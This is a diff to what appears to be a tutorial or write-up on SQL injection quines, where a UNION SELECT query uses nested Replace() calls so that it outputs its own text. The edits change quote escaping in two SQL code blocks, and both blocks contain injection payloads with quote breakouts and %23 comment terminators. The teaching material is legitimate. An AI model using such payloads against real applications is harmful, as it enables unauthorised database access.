@@ -129,7 +129,7 @@ Thus, we can see how the query repeats itself.
 ## Modified Quine
 
 ```sql
-' UNION SELECT Replace(Replace(
+\' UNION SELECT Replace(Replace(
 '" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23',
 char(34),char( 39)),char(36), 
 '" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23')
@@ -181,8 +181,8 @@ Replace all occurrences of `char(36)` (dollar sign `$` character) with the o
 The final result of the query is the string after both replacements, as follows:
 
 ```sql
-' UNION SELECT 
-\'\' UNION SELECT Replace(Replace(
+\' UNION SELECT 
+'\' UNION SELECT Replace(Replace(
 \'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23\'
 ,char(34),char(39)),char(36),
 \'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$")%23\'
